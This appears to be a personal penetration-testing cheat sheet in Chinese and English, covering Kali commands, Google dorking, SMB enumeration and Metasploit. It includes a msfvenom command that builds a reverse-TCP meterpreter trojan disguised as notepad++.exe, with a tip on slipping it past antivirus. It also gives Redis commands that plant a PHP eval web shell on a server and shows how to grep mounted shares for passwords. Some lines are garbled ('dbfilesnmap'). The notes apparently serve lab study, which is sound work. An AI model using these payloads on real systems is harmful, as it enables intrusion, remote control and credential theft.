#### kali cli
```php
nano = vim
history | tail -500 // 有帶時間的指令歷史紀錄
或改設定
echo 'export HISTTIMEFORMAT="%F %T "' >>~/.bashrc
source ~/.bashrc

mkdir  //new one 
rmdir  //delete one
locate  = find = which
locate <keyword>
find /path/  -name     //檔案名稱
find /path/  -type     //檔案種類
find /path/  -size+-   //檔案大小
find /path/  -mtime +- //修改時間
ping -c 1 <target> //ping onetime
cut -d " " -f 4 // 以空格當區隔,前面的第四個字串
sed 's/.$//'
sort -u  //排序？
for ip in $(cat iplist.txt); do nmap -Pn $ip; done //做文件裡面的ip的掃描
```
#### google search
```ymal
查子域名 或 phpinfo  真實IP
asm.ca.com/en/ping.php
webkaka
dnsdb.io/
waf : sqli xxs csrf ....

site: <url> //特定網址搜尋結果
-site:<url> //不顯示特定網址開頭結果
filetype:<type>//只搜尋特定檔案種類
"<url>" //精確搜尋
link: <url>//??
"ulr*" //什麼開頭的搜尋
related:<url> //找類似的其他網頁
google search syntax//搜尋指令
google hacking database//搜尋敏感資料指令
shodan //not been secure webcam
theharvester // find type of emailladdres
```
#### TCP UDP
```php
wireshark
TCP Scan= http ftp telnet
UDP= dns dhcp snmp
MSF console // other portscan app
```

```php
ssh -c <cipherType> <target>
// ssh -c aes128-cbc 127.0.0.1
owasp dirbuster 
nikto -h <target>:<port> //找目錄
dirbuster / wordlists //找目錄
SMB
#locate smb.conf
#emum4linux <target>

Mount shares
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
mount shares 2
sudo apt-get install cifs-utils
mkdir /mnt/Replication
mount -t cifs //10.10.10.100/Replication /mnt/Replication -o
username=<username>,password=<password>,domain=active.htb
grep -R password /mnt/Replication/

dnsrecom -d <target> -t axfr
ftp snmp smtp
```
```php
kioptrix level 1
netcat
connecting listening
bind shells
reverse shells


tar 命令，
cvf 进行压缩，
xvf 进行解压，
c 是压缩的意思，v 是显示详细过程，f 是文件名，
x 是解压
```
FileTransfers
```
fuzzing??
HTTP
wget // for linux most
FTP
powershell
```
Metasploit-meterpreter
```php
生成遠端木馬 msfvenom 鍵盤 鏡頭監控
msfvenom -p <payload> lhost=<kali_ip> lport=<port> -f exe <files> -x notepad++.exe -o notepad++.exe 
<payload>= OS windows/架構x64/作用meterpreter/方式reverse_tcp
use exploit/multi/handler
set payload <>
set lhost <>
set lport <>
run
passby AV 加密檔 壓縮檔 包起來
```
Redis
```php
https://www.bilibili.com/video/BV163411972n?p=37
redis (6379)= key-value database 高速讀寫儲存緩存
nmap -v -Pn -p 6379 -sV --script="redis-info"
##redis-cli.exe. -h <ip> -p 6379
#config set dir /var/www/SSRF/    登入絕對目錄
#config set dbfilesnmap shell.php
#set x "<?php @eval($_POST['test']).?>"
#save

```
